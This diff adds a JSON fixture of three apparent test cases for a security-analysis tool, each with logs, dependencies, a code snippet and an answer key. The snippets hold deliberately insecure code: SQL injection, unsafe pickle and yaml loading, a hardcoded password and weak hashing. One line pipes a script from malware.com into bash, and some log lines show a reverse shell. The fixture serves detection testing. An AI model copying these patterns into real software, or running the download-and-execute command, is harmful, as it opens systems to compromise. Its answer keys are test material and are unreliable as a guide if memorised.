@@ -1,0 +1,84 @@
+[
+  {
+    "case_id": "case_001",
+    "logs": [
+      "2024-04-25T10:15:32 Failed password for user admin from 192.168.1.100",
+      "2024-04-25T10:15:33 Failed password for user admin from 192.168.1.100",
+      "2024-04-25T10:15:34 Failed password for user admin from 192.168.1.100",
+      "2024-04-25T10:15:35 Failed password for user admin from 192.168.1.100",
+      "2024-04-25T10:15:36 Too many authentication failures for user admin"
+    ],
+    "requirements": "django==3.0.0\nflask==1.0.0\nrequests==2.20.0\npillow==5.0.0",
+    "code": "import os\ndb_password = 'admin123'\ndb.execute('SELECT * FROM users WHERE id=' + user_id)\nsubprocess.call('ls -la', shell=True)",
+    "known_truth": {
+      "attack_type": "credential stuffing",
+      "flagged_logs": [
+        "Failed password for user admin from 192.168.1.100",
+        "Too many authentication failures for user admin"
+      ],
+      "flagged_code": [
+        "db_password = 'admin123'",
+        "db.execute('SELECT * FROM users WHERE id=' + user_id)",
+        "subprocess.call('ls -la', shell=True)"
+      ],
+      "flagged_requirements": [
+        "django==3.0.0",
+        "flask==1.0.0"
+      ]
+    }
+  },
+  {
+    "case_id": "case_002",
+    "logs": [
+      "2024-04-25T11:20:45 sudo -u www-data /usr/bin/bash",
+      "2024-04-25T11:20:46 Executing: /tmp/shell.sh",
+      "2024-04-25T11:20:47 exec /bin/bash -i",
+      "2024-04-25T11:20:48 Connection established to 10.0.0.50:4444"
+    ],
+    "requirements": "numpy==1.15.0\nyaml\npickle",
+    "code": "import pickle\ndata = pickle.loads(user_input)\nimport yaml\nconfig = yaml.load(untrusted_config)\nos.system('curl http://malware.com/shell.sh | bash')",
+    "known_truth": {
+      "attack_type": "remote code execution",
+      "flagged_logs": [
+        "sudo -u www-data /usr/bin/bash",
+        "exec /bin/bash -i",
+        "Connection established to 10.0.0.50:4444"
+      ],
+      "flagged_code": [
+        "pickle.loads(user_input)",
+        "yaml.load(untrusted_config)",
+        "os.system('curl http://malware.com/shell.sh | bash')"
+      ],
+      "flagged_requirements": [
+        "numpy==1.15.0"
+      ]
+    }
+  },
+  {
+    "case_id": "case_003",
+    "logs": [
+      "2024-04-25T14:30:20 ssh: user1 from 8.8.8.8",
+      "2024-04-25T14:30:21 Permission denied (publickey,password)",
+      "2024-04-25T14:30:22 ssh: user1 from 8.8.4.4",
+      "2024-04-25T14:30:23 Accepted password for user1",
+      "2024-04-25T14:30:24 Connection established from 8.8.4.4 port 22"
+    ],
+    "requirements": "requests==2.18.0\nurllib3==1.22\ncertifi==2016.0.0",
+    "code": "import hashlib\npassword_hash = hashlib.md5(password).hexdigest()\nverify = hashlib.sha1(stored).hexdigest() == computed",
+    "known_truth": {
+      "attack_type": "phishing compromise",
+      "flagged_logs": [
+        "Accepted password for user1",
+        "Connection established from 8.8.4.4 port 22"
+      ],
+      "flagged_code": [
+        "hashlib.md5(password).hexdigest()",
+        "hashlib.sha1(stored).hexdigest()"
+      ],
+      "flagged_requirements": [
+        "requests==2.18.0",
+        "urllib3==1.22"
+      ]
+    }
+  }
+]
